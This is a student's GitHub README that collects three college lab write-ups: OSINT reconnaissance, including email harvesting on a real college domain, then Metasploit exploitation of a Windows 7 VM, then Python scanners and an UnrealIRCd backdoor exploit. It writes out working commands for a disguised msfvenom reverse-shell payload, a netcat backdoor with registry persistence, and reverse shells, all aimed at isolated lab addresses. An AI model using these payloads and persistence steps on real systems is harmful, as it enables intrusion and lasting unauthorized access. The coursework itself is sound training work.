[Lab07-README.md](https://github.com/user-attachments/files/28288223/Lab07-README.md)[Ethical-LAB-README (3).md](https://github.com/user-attachments/files/28243429/Ethical-LAB-README.3.md)
# 🧪 Ethical Hacking & Reconnaissance Lab

> **Fanshawe College — Ethical Hacking and Exploits**
> Hands-on penetration testing and OSINT reconnaissance lab performed inside a virtualized Kali Linux environment on VMware Workstation.

---

## 🛠️ Tools Used

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![Nmap](https://img.shields.io/badge/Nmap-0E83CD?style=flat-square&logo=nmap&logoColor=white)
![VMware](https://img.shields.io/badge/VMware-607078?style=flat-square&logo=vmware&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)

| Tool | Purpose |
|---|---|
| **CeWL** | Custom wordlist generation from target websites |
| **WHOIS** | Passive domain reconnaissance |
| **theHarvester** | Email & host enumeration via OSINT |
| **SpiderFoot** | Automated OSINT intelligence gathering |
| **Nmap** | Network port scanning & service discovery |
| **Unicornscan** | High-speed advanced TCP/UDP port scanning |

---

## 🖥️ Lab Environment

- **Platform:** VMware Workstation
- **Attacker OS:** Kali Linux 2022.3
- **Target Network:** Simulated enterprise network (10.0.0.1/24)
- **Target Domains:** transpirenetworks.com, fanshawec.ca (OSINT exercises)
- **Lab Machines:** Windows 10, Windows 7, Windows Server 2016, Security Onion, Router, Client

---

## 📌 Lab Tasks & Screenshots

---

### Task 1 — CeWL: Custom Wordlist Generation

**Objective:** Scrape a target website to generate a custom wordlist for use in password attacks.

**Command used:**
```bash
sudo cewl http://www.transpirenetworks.com -w transpire.txt
cat transpire.txt
```

**What it does:**
- CeWL crawls the target website and extracts unique words
- The generated wordlist (`transpire.txt`) can be used with tools like Hydra or John the Ripper
- Builds context-aware, target-specific wordlists for credential attacks

![CeWL Wordlist Generation](Lab02/1.jpg)

---

### Task 2 — WHOIS: Passive Domain Reconnaissance

**Objective:** Gather domain registration and ownership information without touching the target.

**Command used:**
```bash
whois transpirenetworks.com
```

**Key information extracted:**
- Registrar: Tucows Domains Inc.
- Creation Date: 2013-04-30
- Name Servers: NS1.HOSTPAPA.COM / NS2.HOSTPAPA.COM
- Domain Status: clientTransferProhibited

**Why it matters:** WHOIS is a fully passive technique — it gathers intelligence without sending a single packet to the target, making it undetectable.

![WHOIS Lookup](Lab02/2.jpg)

---

### Task 3 — theHarvester: Email & Host Enumeration

**Objective:** Enumerate email addresses and hostnames associated with a target organization.

**Command used:**
```bash
theHarvester -d fanshawec.ca -b google
```

**Results:**
- 📧 **26 email addresses** discovered (staff, admin, student accounts)
- 🖥️ **2 hosts** found:
  - `www.fanshawec.ca` → `52.60.137.41`
  - `x22www.fanshawec.ca`

**Why it matters:** Email harvesting is a critical OSINT step — identifying staff emails exposes potential phishing and social engineering attack vectors.

![theHarvester Email Enumeration](Lab02/3.jpg)

---

### Task 4 — SpiderFoot: Automated OSINT Intelligence Gathering

**Objective:** Run an automated multi-source OSINT scan to build a full intelligence profile of the target.

**Tool:** SpiderFoot v4.0 (web UI at `127.0.0.1:6065`)

**Scan Results Summary:**

| Data Type | Unique | Total |
|---|---|---|
| Affiliate Email Addresses | 4 | 4 |
| Blacklisted Internet Names | 1 | 1 |
| Cloud Storage Buckets | 6 | 6 |
| Email Addresses | 3 | 3 |
| Internet Names | 14 | 17 |
| Malicious Internet Names | 1 | 1 |
| Public Code Repositories | 11 | 11 |
| Raw Data from RIRs/APIs | 189 | 207 |
| Vulnerability - Third Party Disclosure | 2 | 2 |

**Why it matters:** SpiderFoot automates hours of manual OSINT work, aggregating data from dozens of sources simultaneously.

![SpiderFoot OSINT Scan](Lab02/4.jpg)

---

### Task 5 — Nmap: Network Port Scanning

**Objective:** Discover live hosts and open ports on the target network subnet.

**Command used:**
```bash
nmap -T4 -F 10.0.0.1/24
```

**Results:**
- **Host:** `spokhrel157855-w10` (10.0.0.10) — **UP**
  - `135/tcp` open — msrpc
  - `139/tcp` open — netbios-ssn
  - `445/tcp` open — microsoft-ds

**Why it matters:** Open ports 135, 139, and 445 are Windows SMB services — a known attack surface for exploits like EternalBlue (MS17-010).

![Nmap Port Scan](Lab02/5.jpg)

---

### Task 6 — Unicornscan: High-Speed Advanced Port Scanning

**Objective:** Perform a high-speed asynchronous TCP scan as an advanced alternative to Nmap.

**Command used:**
```bash
sudo unicornscan -mT 10.0.0.1/24 -p 139 -Iv -r 200 -s 192.168.1.2
```

**Flags explained:**
- `-mT` — TCP scan mode
- `-p 139` — Target NetBIOS port
- `-r 200` — 200 packets per second
- `-s` — Source address for packets

**Why it matters:** Unicornscan is faster than Nmap for large-scale scanning and supports source address randomization for stealthier authorized red team engagements.

![Unicornscan Advanced Scanning](Lab02/6.jpg)

---

### Task 7 — Unicornscan: Scan Results & Flag Reference

**Objective:** Demonstrate a live Unicornscan TCP scan against the target subnet and review the tool's advanced flag options.

**Command used:**
```bash
sudo unicornscan -mT 10.0.0.1/24 -p 139 -Iv -r 200 -s 192.168.1.2
```

**Live scan output breakdown:**
- `adding 10.0.0.0/24 mode 'TCPscan' ports '139' pps 200` — Confirming subnet, port, and packet rate
- `using interface(s) eth1` — Scanning through the eth1 network interface
- `scanning 2.56e+02 total hosts` — Scanning all 256 hosts in the /24 subnet
- `sender statistics 198.7 pps with 256 packets sent total` — Confirms ~200 packets/sec rate
- `listener statistics 0 packets received 0 dropped` — No responses on port 139 from this subnet

**Key flag reference shown in this screenshot:**

| Flag | Description |
|---|---|
| `-Q, --quiet` | Suppress output to screen |
| `-r, --pps` | Packets per second (higher = less accurate) |
| `-R, --repeats` | Repeat packet scan N times |
| `-s, --source-addr` | Source address for packets (supports random `r`) |
| `-S, --no-shuffle` | Do not randomize port order |
| `-t, --ip-ttl` | Set TTL on sent packets |
| `-v, --verbose` | Verbose output (stack `-vvvvv` for maximum detail) |
| `-w, --safefile` | Write PCAP file of received packets |
| `-W, --fingerprint` | OS fingerprint (0=Cisco, 1=OpenBSD, 2=Windows XP, 5=nmap, 6=Linux) |
| `-z, --sniff` | Sniff alike mode |
| `-Z, --drone-str` | Drone string for distributed scanning |

**Why it matters:** The 0 received packets on port 139 means NetBIOS is not exposed on this subnet — an important negative finding in a pentest report that rules out SMB-based attack vectors on this network segment.

![Unicornscan Scan Results](Lab02/7.jpg)

---

## 📚 Key Takeaways

- **Passive recon** (WHOIS, theHarvester, SpiderFoot) gathers intel without touching the target
- **Active recon** (Nmap, Unicornscan) identifies live hosts and open services
- **Wordlist generation** (CeWL) supports the credential attack phase
- Open SMB ports (135, 139, 445) represent real-world Windows attack surfaces
- Automated tools like SpiderFoot dramatically accelerate the OSINT phase of a pentest

---

## ⚠️ Disclaimer

> All activities were performed in a **controlled, isolated lab environment** for educational purposes as part of the Fanshawe College Information Security Management program. No unauthorized systems were targeted.

---

## 👨‍💻 Author

**Sudip Pokhrel** | Cybersecurity & IT Support Enthusiast

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)


# 💀 Exploitation & Post-Exploitation Lab (Lab 06)

> **Fanshawe College — Ethical Hacking and Exploits**
> A full end-to-end exploitation lab using Metasploit Framework, Meterpreter, and Netcat to compromise a Windows 7 target, establish persistence, and manage remote access — all within an isolated VMware lab environment.

---

## 🛠️ Tools Used

![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square&logo=metasploit&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![VMware](https://img.shields.io/badge/VMware-607078?style=flat-square&logo=vmware&logoColor=white)
![Windows](https://img.shields.io/badge/Windows_7-0078D6?style=flat-square&logo=windows&logoColor=white)

| Tool | Purpose |
|---|---|
| **Metasploit Framework (msfvenom)** | Generate malicious payload (.exe) |
| **multi/handler** | Listen for incoming reverse shell connection |
| **Meterpreter** | Post-exploitation shell on target |
| **Netcat (nc.exe)** | Upload and establish persistent backdoor |
| **Windows Registry (regedit)** | Set backdoor to run on startup |

---

## 🖥️ Lab Environment

- **Attacker:** Kali Linux 2022.3 (`10.0.0.99`) — VMware Workstation
- **Target:** Windows 7 (`10.0.0.7`) — VMware Workstation
- **Attack Type:** Client-side exploit via malicious executable + reverse TCP shell
- **Persistence Method:** Windows Registry `HKLM\...\Run` key

---

## 📌 Attack Stages & Screenshots

---

### Stage 1 — Payload Generation with msfvenom

**Objective:** Create a malicious Windows executable that connects back to the attacker when run on the target.

**Command used:**
```bash
msfvenom -p windows/meterpreter_reverse_tcp \
  LHOST=10.0.0.99 LPORT=4444 \
  -e x86/shikata_ga_nai -i 1 \
  -f exe -o /var/www/html/freegame.exe
```

**What happened:**
- `msfvenom` generated a reverse TCP Meterpreter payload disguised as `freegame.exe`
- Encoder `x86/shikata_ga_nai` was applied (1 iteration) to obfuscate the payload
- Final payload size: **175,715 bytes** | Final exe size: **250,880 bytes**
- Saved to `/var/www/html/` so it can be served via the web server for the victim to download
- `uname -a` confirms the attacker machine: Kali Linux 5.18.0 x86_64

![msfvenom Payload Generation](Lab06/1.png)

---

### Stage 2 — Setting Up the Listener & Getting a Shell

**Objective:** Configure Metasploit's `multi/handler` to catch the reverse connection when the victim runs the payload.

**Commands used:**
```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 10.0.0.99
exploit
```

**What happened:**
- Reverse TCP handler started on `10.0.0.99:4444`
- When the victim ran `freegame.exe`, a **Meterpreter session** was opened:
  `10.0.0.99:4444 → 10.0.0.7:49159`
- `meterpreter > shell` dropped into a full Windows command shell
- `dir` confirmed we are inside `C:\Users\User\Desktop\` on the Windows 7 target
- `meterpreter > background` sent the session to background for further tasks

![Metasploit Listener & Meterpreter Session](Lab06/2.png)

---

### Stage 3 — File Upload & Filesystem Navigation

**Objective:** Upload tools to the target and explore the filesystem.

**Commands used:**
```bash
upload /usr/share/windows-resources/binaries/nc.exe c:\
meterpreter > shell
cd \
dir
```

**What happened:**
- `nc.exe` (Netcat) was uploaded from Kali to the target's `C:\` drive
- First upload attempt failed (`spokhrel.txt` — wrong path), second succeeded
- After dropping into a Windows shell, navigated to `C:\` root using `cd ..` commands
- `dir` output confirmed `nc.exe` (59,392 bytes) now exists on the target alongside system files:
  - `7z920.exe`, `autoexec.bat`, `config.sys`, `nc.exe`, `spokhrel.txt`

![File Upload via Meterpreter](Lab06/3.png)

---

### Stage 4 — Registry Persistence (Backdoor)

**Objective:** Make the backdoor survive reboots by adding it to the Windows startup registry key.

**Commands used:**
```bash
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  -v Backdoor -d C:\\nc.exe

meterpreter > background
msf6 exploit(multi/handler) > sessions -k 1
msf6 exploit(multi/handler) > date && hostname
```

**What happened:**
- A registry key `Backdoor` was set under `HKLM\...\CurrentVersion\Run` pointing to `C:\nc.exe`
- This ensures `nc.exe` launches automatically every time Windows boots
- Session was killed (`sessions -k 1`) to simulate the victim restarting their machine
- `date && hostname` confirmed attacker system info: `spokhrel157855`, Oct 21 2023

![Registry Persistence Setup](Lab06/4.png)

---

### Stage 5 — Verifying Persistence on the Target (Windows Registry Editor)

**Objective:** Confirm on the Windows 7 machine that the backdoor registry key was successfully written.

**What was shown:**
- Windows Registry Editor open at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- **Backdoor** key visible with data value `C:\nc.exe` — confirming successful persistence
- `nc.exe` also launched automatically (visible as a black window in the background)
- Command prompt shows `net config workstation | find "name"`:
  - Computer name: `\\SPOKHREL157855-W7`
  - Full name: `spokhrel157855-W7`
  - Username: `User`

![Registry Verification on Windows 7](Lab06/5.png)

---

### Stage 6 — Reconnection & Backdoor Cleanup

**Objective:** Reconnect to the target after reboot using the persistent backdoor, then clean up traces.

**Commands used:**
```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 10.0.0.99
exploit

meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

**What happened:**
- After the Windows 7 machine rebooted, `nc.exe` auto-launched (due to the Run key)
- Metasploit caught the incoming reverse connection — **Meterpreter session 1 opened** again
- `reg enumkey` listed the Run values: `VMware User Process` and `Backdoor`
- `reg deleteval -v Backdoor` successfully removed the backdoor from the registry
- Output: `Successfully deleted Backdoor.` — simulating post-pentest cleanup

![Reconnection and Backdoor Removal](Lab06/6.png)

---

### Stage 7 — Advanced Registry Manipulation

**Objective:** Demonstrate setting a registry value with advanced flags and verifying it.

**Commands used:**
```bash
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  -v Backdoor -d C:\\nc.exe -ldp 1234 -e cmd.exe

meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  -v Backdoor
```

**Results:**
- Registry key successfully set with value `1234`
- `reg queryval` confirmed:
  - Key: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - Name: `Backdoor`
  - Type: `REG_SZ`
  - Data: `1234`
- Bottom terminal: `uname -a && date` shows Kali Linux attacker system timestamp: Oct 21 2023

![Advanced Registry Manipulation](Lab06/7.png)

---

### Stage 8 — Netcat Persistent Access & Final Verification

**Objective:** Use Netcat directly to connect to the backdoor on the target machine and verify full access.

**Commands used:**
```bash
nc 10.0.0.7 1234
cd \
dir
exit
date
uname -a
```

**What happened:**
- Netcat connected directly to Windows 7 (`10.0.0.7`) on port `1234`
- Full Windows command shell obtained — `Microsoft Windows [Version 6.1.7600]`
- `dir C:\` listing confirmed all files on the target:
  - `7z920.exe`, `autoexec.bat`, `config.sys`, `nc.exe`, `spokhrel.txt`
  - Directories: `PerfLogs`, `Program Files`, `Security`, `Users`, `Windows`
- Successfully exited and returned to Kali
- Final `uname -a` confirms Kali Linux 5.18.0 attacker system: Oct 24 2023

![Netcat Persistent Access](Lab06/8.png)

---

## 🔁 Full Attack Chain Summary

```
[1] msfvenom → generate freegame.exe (reverse TCP payload)
      ↓
[2] Victim runs freegame.exe → Meterpreter session opened
      ↓
[3] Upload nc.exe to C:\ on target via Meterpreter
      ↓
[4] Write nc.exe to HKLM\...\Run registry key (persistence)
      ↓
[5] Verify registry key on Windows 7 (regedit)
      ↓
[6] Kill session → target reboots → nc.exe auto-runs
      ↓
[7] Meterpreter re-connects → verify & clean registry
      ↓
[8] Netcat connects directly to backdoor port 1234
```

---

## 📚 Key Takeaways

- `msfvenom` can create encoded payloads disguised as legitimate files to bypass basic defenses
- **Reverse TCP shells** initiate the connection from the victim → attacker, bypassing firewalls
- **Meterpreter** provides a powerful post-exploitation framework (upload, shell, registry control)
- **Registry Run keys** are a classic persistence mechanism in Windows environments
- **Netcat** (`nc.exe`) is a lightweight tool for maintaining persistent access via raw TCP
- Proper pentest cleanup includes removing backdoors, registry keys, and uploaded files

---

## ⚠️ Disclaimer

> All activities were performed in a **controlled, isolated VMware lab environment** for educational purposes as part of the Fanshawe College Information Security Management program. No real systems were targeted or harmed.

---

## 👨‍💻 Author

**Sudip Pokhrel** | Cybersecurity & IT Support Enthusiast

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)


[Uploadin# 🐍 Python Scripting for Penetration Testing (Lab 07)

> **Fanshawe College — Ethical Hacking and Exploits**
> A hands-on lab focused on writing custom Python scripts for network reconnaissance and exploitation, combined with using Metasploit to exploit a known IRC backdoor vulnerability on a Metasploitable2 target.

---

## 🛠️ Tools & Technologies Used

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square&logo=metasploit&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![VMware](https://img.shields.io/badge/VMware-607078?style=flat-square&logo=vmware&logoColor=white)

| Tool / Script | Purpose |
|---|---|
| **python_port_scan.py** | Custom Python port scanner targeting a single host |
| **lan_scan.py** | Custom Python LAN scanner with service version detection |
| **clientsocket.py** | Python TCP client socket script |
| **serversocket.py** | Python TCP server socket script on Metasploitable2 |
| **Metasploit (unreal_ircd_3281_backdoor)** | Exploit UnrealIRCd 3.2.8.1 backdoor vulnerability |

---

## 🖥️ Lab Environment

- **Attacker:** Kali Linux 2022.3 (`10.0.0.99`) — VMware Workstation
- **Target 1:** Metasploitable2 Linux (`10.0.0.200`) — intentionally vulnerable VM
- **Target 2:** Windows 7 (`10.0.0.7`) — also in the lab network
- **Scripts Location:** `/home/kali/scripts/`

---

## 📌 Lab Tasks & Screenshots

---

### Task 1 — Custom Python Port Scanner (`python_port_scan.py`)

**Objective:** Write and run a custom Python script to scan all open ports on the Metasploitable2 target.

**Script execution:**
```bash
nano python_port_scan.py     # edit script
./python_port_scan.py        # run it
# Enter IP address to scan: 10.0.0.200
```

**Open ports discovered on `10.0.0.200`:**

| Port | Port | Port |
|---|---|---|
| 21 | 512 | 3306 |
| 22 | 513 | 3632 |
| 23 | 514 | 5432 |
| 25 | 1099 | 5900 |
| 53 | 1524 | 6000 |
| 80 | 2049 | 6667 |
| 111 | 3306 | 6697 |
| 139 | 35538 | 8009 |
| 445 | 36893 | 8180 |
| | 37054 | 39104 |

**Why it matters:**
- Writing your own port scanner demonstrates understanding of **TCP socket programming** in Python
- The large number of open ports confirms Metasploitable2 is intentionally vulnerable
- Port 6667 (IRC) is a key finding — this will be exploited in Task 3
- `uname -a` confirms: Kali Linux 5.18.0-kali5 x86_64, Oct 26 2023

![Python Port Scanner](Lab07/1.png)

---

### Task 2 — Custom Python LAN Scanner with Service Detection (`lan_scan.py`)

**Objective:** Extend the port scanner to identify running services and their versions on each open port.

**Script execution:**
```bash
nano lan_scan.py
./lan_scan.py
```

**Results — `10.0.0.200` (Metasploitable2) service version scan:**

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23 | Telnet | Linux telnetd |
| 25 | SMTP | Postfix smtpd |
| 53 | DNS | ISC BIND 9.4.2 |
| 80 | HTTP | Apache httpd 2.2.8 |
| 111 | RPC | 2 |
| 139 | NetBIOS | Samba smbd 3.X – 4.X |
| 445 | SMB | Samba smbd 3.X – 4.X |
| 512 | exec | netkit-rsh rexecd |
| 513 | login | OpenBSD or Solaris rlogind |
| 514 | shell | Netkit rshd |
| 1099 | RMI | GNU Classpath grmiregistry |
| 1524 | shell | Bash shell |
| 2049 | NFS | 2-4 |
| 3306 | MySQL | MySQL 5.0.51a-3ubuntu5 |
| 5432 | PostgreSQL | DB 8.3.0 – 8.3.7 |
| 5900 | VNC | VNC |
| 6667 | IRC | **UnrealIRCd** ← key target |
| 8009 | AJP | Apache Jserv |
| 8180 | HTTP | Apache Tomcat/Coyote JSP 1.1 |

**Why it matters:** Service version detection is critical for identifying exploitable vulnerabilities. **vsftpd 2.3.4** and **UnrealIRCd** on port 6667 are both known to have backdoors — exactly what will be exploited next.

![LAN Scanner with Service Detection](Lab07/2.png)

---

### Task 3 — Exploiting UnrealIRCd Backdoor with Metasploit

**Objective:** Use Metasploit to exploit the known backdoor in UnrealIRCd 3.2.8.1 running on port 6667 of the Metasploitable2 target.

**Commands used:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set rhosts 10.0.0.200
set payload cmd/unix/reverse
set lhost 10.0.0.99
exploit
```

**What happened:**
- Metasploit connected to `10.0.0.200:6667` (UnrealIRCd IRC server)
- Exploit triggered the hidden backdoor in UnrealIRCd 3.2.8.1
- Reverse TCP double handler started on `10.0.0.99:4444`
- Two client connections accepted as part of the backdoor mechanism
- Echo command sent: `VRSQP2DpObyOx93S` — verified matching on both sockets
- **Command shell session 1 opened:** `10.0.0.99:4444 → 10.0.0.200:45928`
- `whoami` → **root** — full root access obtained on Metasploitable2!
- Bottom terminal: `uname -a && date` on Kali confirms: Oct 26 2023 09:04 AM

**Why it matters:** UnrealIRCd 3.2.8.1 contains a hardcoded backdoor introduced by attackers who compromised the source code. This is a real CVE (CVE-2010-2075) and a classic example of a **supply chain attack**.

![UnrealIRCd Backdoor Exploit](Lab07/3.png)

---

### Task 4 — Python TCP Client Socket (`clientsocket.py`)

**Objective:** Write a Python TCP client socket script that connects to a server and receives a message.

**Script execution:**
```bash
python clientsocket.py 10.0.0.200
```

**Output:**
```
Hello, spokhrel157855!
```

**What happened:**
- `clientsocket.py` connected to the Metasploitable2 target (`10.0.0.200`) via TCP
- The server responded with a personalized greeting: `Hello, spokhrel157855!`
- This confirms a successful TCP socket connection between Kali (client) and Metasploitable2 (server)
- `uname -a && date` confirms: Kali Linux 5.18.0, Oct 31 2023 02:24 PM

**Why it matters:** Understanding TCP socket programming is fundamental to network security. This skill is used in building custom exploits, reverse shells, C2 (command & control) tools, and network monitoring scripts.

![Python Client Socket](Lab07/4.png)

---

### Task 5 — Python TCP Server Socket on Metasploitable2 (`serversocket.py`)

**Objective:** Run the Python server socket script on the Metasploitable2 machine to accept incoming connections.

**Script execution on Metasploitable2:**
```bash
cd /home/msfadmin/scripts
./serversocket.py
# Waiting for a client to connect ...
# Got a connection from ('10.0.0.99', 45052)
```

**File metadata verified:**
```
File: serversocket.py
Size: 389 bytes     Blocks: 8
Access: (0777/-rwxrwxrwx)  Uid: root  Gid: root
Modify: 2023-10-28 05:07:16
```

**What happened:**
- `serversocket.py` was run on **Metasploitable2** (`spokhrel157855-ms2`)
- Server waited and accepted an incoming TCP connection from Kali (`10.0.0.99:45052`)
- `stat serversocket.py` confirmed the script details — world-readable/writable (0777 permissions)
- `hostname` confirmed the server machine: `spokhrel157855-ms2`

**Why it matters:** Running a server socket on the target demonstrates the full **client-server communication model** used in network programming. The overly permissive `0777` permissions on the script is itself a misconfiguration finding — a real security risk in production environments.

![Python Server Socket on Metasploitable2](Lab07/5.png)

---

## 🔁 Full Lab Workflow Summary

```
[1] python_port_scan.py  → discovered 25+ open ports on Metasploitable2
        ↓
[2] lan_scan.py          → identified service versions (UnrealIRCd on port 6667)
        ↓
[3] Metasploit exploit   → exploited UnrealIRCd backdoor → root shell obtained
        ↓
[4] clientsocket.py      → Python TCP client connected to Metasploitable2 server
        ↓
[5] serversocket.py      → Python TCP server accepted connection from Kali client
```

---

## 📚 Key Takeaways

- **Custom Python scripts** can replicate and extend what tools like Nmap do, showing deeper technical understanding
- **Service version detection** is essential — knowing `vsftpd 2.3.4` and `UnrealIRCd 3.2.8.1` are running immediately points to known CVEs
- **CVE-2010-2075** (UnrealIRCd backdoor) is a real supply chain attack — attackers modified the source code before distribution
- **TCP socket programming** in Python is the foundation for building custom exploits, listeners, and C2 tools
- **File permissions** like `0777` on scripts are a misconfiguration risk — any user can read, modify, or execute them

---

## ⚠️ Disclaimer

> All activities were performed in a **controlled, isolated VMware lab environment** for educational purposes as part of the Fanshawe College Information Security Management program. Metasploitable2 is an intentionally vulnerable VM designed for security training. No real systems were targeted or harmed.

---

## 👨‍💻 Author

**Sudip Pokhrel** | Information Security Analyst — GRC

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)
g Lab07-README.md…]()
